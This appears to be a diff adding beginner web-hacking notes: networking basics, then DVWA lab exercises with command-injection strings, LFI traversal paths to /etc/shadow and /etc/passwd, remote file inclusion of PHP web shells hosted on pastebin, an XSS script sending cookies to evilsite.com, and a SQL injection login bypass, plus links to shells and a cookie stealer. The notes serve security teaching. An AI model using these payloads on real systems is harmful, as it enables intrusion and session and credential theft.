@@ -1,0 +1,128 @@
+== Networking ==
+IPv4/IPv6
+ ipv4 127.0.0.1
+ ipv6 2001:db8:3c4d:15::1a2f:1a2b.
+DNS
+  translates domain names into ip addressess
+
+client server
+        CLIENT = YOU(r device)
+        web server in this case
+        client: "hey google give me x page" -> upload
+        google: "here I found it, go ahead and download this page" <- download
+        request -> reply
+
+TCP/UDP
+
+web pages
+        files. .html .php .aspx
+        request: /dogs.html -> server: here is dogs.html
+request/reply/"everything is a file"
+frontend/backend
+
+get/post/etc
+        "hey google, search for ppony fanfics"
+        request: POST search=pony fanfics
+
+frontend: is the stuff sent to your Browser
+        and the web pages you make requests to
+        (public, client-facing)
+        html/css/javascript
+backend: web servers,
+        php, node,
+        database, actions, api
+    
+== Basic Web Hacking ==
+DVWA
+Web Browser:
+* command injection
+        get the GET var (ip)
+        load that into a command (ping command)
+        execute
+        theory: execute("ping $ip");
+        $ip = 8.8.8.8
+                Theory execute("ping 8.8.8.8")
+        $ip = 8.8.8.8; ls
+        $ip = 8.8.8.8 && ls -lah && whoami && groups && id
+        $ip = 8.8.8.8 && echo "hello world" > file.txt
+
+        a few things to try:
+                ; (stack commands)
+                && (stacks commands)
+                ` (executes commands on some systems)
+                echo "something" > file.php (make a file)
+
+* LFI
+        Local File Inclusion
+        "web server loads a file from its own drive and shows it"
+        try making it read a sensitive file?
+        a few things to try:
+                /etc/shadow
+                /etc/passwd
+                ../../../../../../../../etc/passwd
+                Leak sensitive files
+                Database files
+* RFI upload
+        When web server downlaods and executes a remote file
+        like: /page.php?file=file1.php -> /page.php?file=https://pastebin.com/raw/jmtqDfWQ
+        (if you need multiple GET variables):
+                ./page.php?file=https://pastebin.com/raw/jmtqDfWQ&somevar=1337
+                (append &variablename=value)
+        a few things to try:
+                PHP shell
+                        p0wny-shell-FI-mod: https://pastebin.com/raw/jmtqDfWQ ( Source: https://github.com/flozz/p0wny-shell )
+simple-php-shell: https://pastebin.com/raw/uxbKCBGg
+                Malware of any type
+* Stored XSS
+        <script>
+        i=new Image();
+        i.src="http://evilsite.com/cookielogger.php?cookie="+document.cookie;
+        document.appendChild(i);
+        </script>
+* Reflected XSS
+        like search pages, etc
+        uses GET variables in the URL usually
+        requires tricking a victem into clicking a malicious link
+* Open HTTP Redirect
+        get variables usually
+        just let you redirect from a legitimate site to your own
+        usually requires getting a victim to click a malicious link
+
+SQL Injection:
+        "modifying an SQL query to do something fun"
+        Lab: https://www.db-fiddle.com/f/mZ2ftcLLzZLbrEELn38hjQ/17
+        Theory: SELEC
+        $user = Delilah123
+        $password = ??
+        SELECT * FROM users WHERE username='$user' AND password='$password';
+        $password = '
+                SELECT * FROM users WHERE username='Delilah123' AND password=''';
+                ERROR!
+        $password = anythinghere' OR 1=1
+                SELECT * FROM users WHERE username='Delilah123' AND password='anythinghere' OR 1=1'
+                ERROR
+                > always true!
+
+        $password = anythinghere' OR 1=1 -- 
+                -- is an sql comment! (space at start and end)
+                SELECT * FROM users WHERE username='Delilah123' AND password='anythinghere' OR 1=1 -- '
+                EXECUTES AND MATCHES!
+
+#Burp Suite:
+#* Weak session IDs
+#* Brute force
+
+#Coding:
+#* CSRF
+#* XSS keylogger
+#* Advanced XSS+CSRF payload
+
+Links:
+SQL Injection Lab (WIP): https://www.db-fiddle.com/f/mZ2ftcLLzZLbrEELn38hjQ/16
+p0wny-shell-FI-mod: https://pastebin.com/raw/jmtqDfWQ ( Source: https://github.com/flozz/p0wny-shell )
+simple-php-shell: https://pastebin.com/raw/uxbKCBGg
+basic XSS cookie stealer: https://pastebin.com/raw/puftrh39
+General payloads including XSS and SQL Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/
+General hacking: https://cheatsheet.haax.fr/
+Pi Pico W Power Analysis Tool (WIP): https://github.com/PrincessPi3/PiPicoPATLFGGGGG
+
